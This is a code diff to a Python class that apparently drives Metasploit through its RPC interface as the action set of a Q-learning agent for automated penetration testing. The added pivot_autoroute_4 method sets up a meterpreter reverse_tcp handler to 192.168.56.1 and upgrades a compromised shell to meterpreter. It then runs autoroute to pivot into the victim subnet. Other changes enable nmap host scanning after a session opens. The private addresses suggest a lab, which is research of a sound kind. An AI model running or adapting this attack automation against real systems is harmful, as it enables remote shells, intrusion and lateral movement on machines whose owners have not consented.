@@ -33,7 +33,7 @@ class QLearningTable:
         self.nmap_dict={}
         self.success=False
         self.whoami= 'Not root'
-        self.action_in_the_right_shell= False
+        self.action_in_the_right_shell= True
         self.session='0'
         self.session_regex= re.compile("session ([0-9]+)")
         self.action_iteration= 0
@@ -43,9 +43,13 @@ class QLearningTable:
         self.nmap_hosts_launched= 0
         self.victim_number= 0
         self.host_seems_down_nmap_ports= False
+        self.no_active_jobs= False
+        
+        self.log = open('/home/yassir/Bureau/log.txt','a')
         
         self.client = MsfRpcClient('password')
         self.console = MsfRpcConsole(self.client, cb=self.read_console)
+    
         
     def read_console(self, console_data):
         self.global_console_status = console_data['busy']
@@ -105,7 +109,20 @@ class QLearningTable:
         else:
             self.host_seems_down_nmap_ports= False
             
+        if 'No active jobs' in console_data['data']: #j'aurai préféré mettre ce if dans la fonction 'traitement_nmap_ports'
+            self.no_active_jobs= True
+        else:
+            self.no_active_jobs= False
             
+        
+        try:
+            self.log=open('/home/yassir/Bureau/log.txt','a')
+        except BaseException:
+            print('Fichier log deja ouvert')
+        self.log.write(console_data['data'])
+        self.log.close()
+        
+        
         print console_data['data']
         
     def initialise_all_actions(self):
@@ -121,7 +138,7 @@ class QLearningTable:
                 #str(self.distcc): self.distcc,
                 #str(self.postgresql): self.postgresql,
                 #str(self.pivot_autoroute): self.pivot_autoroute,
-                str(self.pivot_autoroute_2): self.pivot_autoroute_2
+                str(self.pivot_autoroute_4): self.pivot_autoroute_4
                 }
 
     def choose_action(self, observation):
@@ -359,8 +376,8 @@ class QLearningTable:
                 if a: # EST CE ENVISAGEABLE DE METTRE CE IF EN TANT QU'ACTION A PART ?
                     self.console.execute('sessions -i ' + str(self.session))
                     time.sleep(4)
-                    #self.nmap_hosts()
-                    #time.sleep(4)
+                    self.nmap_hosts()
+                    time.sleep(4)
                     self.console.execute('whoami')
                     time.sleep(4)
                 
@@ -639,14 +656,14 @@ class QLearningTable:
     def pivot_autoroute_2(self):
         #self.console.execute('sessions -u '+ str(self.session))
         self.console.execute('use multi/manage/shell_to_meterpreter')
-        time.sleep(5)
+        time.sleep(8)
         
         c= self.action_in_the_right_shell
         
         if c:
-            self.console.execute('set LPORT 46540')  # LAISSER CE LPORT ??
+            self.console.execute('set LPORT 46550')  # LAISSER CE LPORT ??
             time.sleep(4)
-            self.console.execute('set session '+ self.session)
+            self.console.execute('set SESSION '+ self.session)
             time.sleep(4)
             self.console.execute('run')
             time.sleep(25) 
@@ -706,6 +723,78 @@ class QLearningTable:
             
         else:
             print('\n2\n')
+            return False, 'Not root'
+        
+    def pivot_autoroute_4(self):
+        self.console.execute('use multi/handler')
+        time.sleep(5)
+        c= self.action_in_the_right_shell
+        
+        if c:
+            self.console.execute('set LPORT 46550')
+            time.sleep(5)
+            self.console.execute('set LHOST 192.168.56.1')
+            time.sleep(5)
+            self.console.execute('set payload linux/x86/meterpreter/reverse_tcp')
+            time.sleep(5)
+            self.console.execute('run -j')
+            time.sleep(8)
+            
+            #self.console.execute('sessions -u '+ str(self.session))
+            self.console.execute('use multi/manage/shell_to_meterpreter')
+            time.sleep(8)
+            self.console.execute('set LPORT 46550')  # LAISSER CE LPORT ??
+            time.sleep(4)
+            self.console.execute('set LHOST 192.168.56.1')  
+            time.sleep(4)
+            self.console.execute('set SESSION '+ self.session)
+            time.sleep(4)
+            self.console.execute('set HANDLER false ')
+            time.sleep(4)
+            self.console.execute('run')
+            time.sleep(15) 
+            #TOUTE CETTE PREMIERE PARTIE JE PEUX LA METTRE DANS UNE FONCTION A PART
+            
+            a= self.success
+            c= self.action_in_the_right_shell
+            
+            if a and c:
+                
+                self.console.execute('jobs')
+                time.sleep(4)
+                while self.no_active_jobs==False:
+                    self.console.execute('sessions -k '+ self.session)
+                    time.sleep(4)
+                    self.console.execute('run')
+                    time.sleep(6)
+                    self.console.execute('jobs')
+                    time.sleep(4)
+                    
+                
+                print('\n1\n')
+                print('SESSION WTF: '+ self.session)
+                
+                self.console.execute('use post/multi/manage/autoroute')
+                time.sleep(8)
+                self.console.execute('set subnet 192.168.56.0') # A MODIFIER, IL FAUT UN ATTRIBUT self.subnet
+                time.sleep(4)
+                self.console.execute('set session '+ str(self.session))
+                time.sleep(4)
+                self.console.execute('run')
+                time.sleep(20)
+                a= self.success
+                
+                if a:
+                    return True, 'Not root'
+                else:
+                    return False, 'Not root'
+                
+            else:
+                print('\n2\n')
+                return False, 'Not root'
+        
+        else:
+            print('\n3\n')
             return False, 'Not root'
 
 
